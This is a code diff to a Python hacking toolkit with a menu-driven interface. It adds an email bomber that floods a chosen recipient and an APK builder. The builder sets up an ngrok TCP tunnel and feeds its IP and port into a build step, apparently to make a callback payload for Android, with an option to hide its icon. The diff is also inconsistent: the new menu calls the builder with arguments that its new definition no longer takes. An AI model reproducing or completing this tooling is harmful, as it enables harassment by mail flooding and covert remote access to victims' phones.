@@ -1,10 +1,10 @@
 import os
 import smtplib
-import socket
 from requests import get
 from googlesearch import search
 from bs4 import BeautifulSoup
 import colorama
+import socket
 
 try:
     from pyngrok import ngrok
@@ -50,7 +50,6 @@ def validate_ip(ip):
 def validate_port(port):
     return port.isdigit() and 1 <= int(port) <= 65535
 
-
 def display_kanki():
     kanki = f"""
              {Colors.red}kiya enjil
@@ -94,7 +93,7 @@ def display_kanki():
   ██▒▒▒▒▒▒██          ██                ██                                
   ██▒▒▒▒██            ██              ██                                  
     ████                ██              ██                                  
-                      ██                ██                                
+                      ██                ██                                 
                       ████████████████████                                
                       ██▒▒▒▒▒▒▒▒▒▒        ████                            
                       ██▒▒▒▒▒▒▒▒          ▒▒▒▒██                          
@@ -103,9 +102,6 @@ def display_kanki():
                       ████████████████████████████
     """
     print(kanki)
-
-
-
 
 def email_bomber(server_choice, user, pwd, to, subject, body, count):
     message = f'From: {user}\nSubject: {subject}\n\n{body}'
@@ -159,33 +155,86 @@ def fetch_page_html(url):
         print(std_output("error") + f"Fetch error: {str(e)}")
         return None
 
-def apk_file_builder(file_name, use_ngrok=False):
-    if use_ngrok and ngrok:
+def apk_file_builder():
+    use_ngrok = input("Use ngrok tunnel? (y/n): ").strip().lower() == "y"
+    apk_name = input("Enter APK file name: ").strip()
+    icon_input = input("Add visible icon? (y/n): ").strip().lower()
+    icon = True if icon_input == "y" else None
+
+    if use_ngrok:
+        if ngrok is None:
+            print(std_output("error") + "Ngrok is not installed.")
+            return
         try:
-            public_url = ngrok.connect(80)
-            print(std_output("info") + f"Ngrok tunnel: {public_url}")
+            from pyngrok import conf
+            conf.get_default().monitor_thread = False
+            port = "8000"
+            tcp_tunnel = ngrok.connect(port, "tcp")
+            domain, port = tcp_tunnel.public_url[6:].split(":")
+            ip = socket.gethostbyname(domain)
+            print(std_output("info") + f"Ngrok Tunnel IP: {ip}, Port: {port}")
+            if build:
+                build(ip, port, apk_name, True, "8000", icon)
         except Exception as e:
             print(std_output("error") + f"Ngrok error: {str(e)}")
-
-    if build:
-        try:
-            build(file_name)
-            print(std_output("info") + f"APK '{file_name}' built successfully.")
-        except Exception as e:
-            print(std_output("error") + f"Build error: {str(e)}")
     else:
-        print(std_output("error") + "Build function not available.")
+        ip = input("Enter IP address: ").strip()
+        port = input("Enter port: ").strip()
+        if not validate_ip(ip) or not validate_port(port):
+            print(std_output("error") + "Invalid IP or port.")
+            return
+        if build:
+            build(ip, port, apk_name, False, None, icon)
 
-if __name__ == "__main__":
+
+def show_help():
+    help_text = """
+    Available commands:
+    /exit        : Exit the program
+    /help        : Show this help message
+    /email-bomber : Start email bomber
+    /osint       : Perform Google search
+    /APK-file    : Build an APK file
+    """
+    print(std_output("info") + help_text)
+
+def main():
     clear_console()
     display_kanki()
 
-    apk_file_builder("myApp.apk", use_ngrok=True)
-    results = search_google("openai")
+    while True:
+        command = input("Enter command (/help for help): ").strip().lower()
 
-    if results:
-        print(std_output("info") + "Search Results:")
-        for link in results:
-            print(link)
+        if command == "/exit":
+            print(std_output("info") + "Exiting program...")
+            break
+        elif command == "/help":
+            show_help()
+        elif command == "/email-bomber":
+            server_choice = input("Choose email server (gmail/yahoo/outlook): ").strip()
+            user = input("Enter your email: ").strip()
+            pwd = input("Enter your email password: ").strip()
+            to = input("Enter recipient email: ").strip()
+            subject = input("Enter email subject: ").strip()
+            body = input("Enter email body: ").strip()
+            count = int(input("How many emails to send? ").strip())
+            email_bomber(server_choice, user, pwd, to, subject, body, count)
+        elif command == "/osint" or command == "/search-links":
+            query = input("Enter search query: ").strip()
+            results = search_google(query)
+            if results:
+                print(std_output("info") + "Search results:")
+                for result in results:
+                    print(result)
+            else:
+                print(std_output("error") + "No results found.")
+        elif command == "/apk-file":
+            file_name = input("Enter APK file name: ").strip()
+            use_ngrok = input("Use ngrok tunnel? (y/n): ").strip().lower() == "y"
+            apk_file_builder(file_name, use_ngrok)
+        else:
+            print(std_output("error") + "Unknown command. Type '/help' for a list of commands.")
 
+if __name__ == "__main__":
+    main()
 
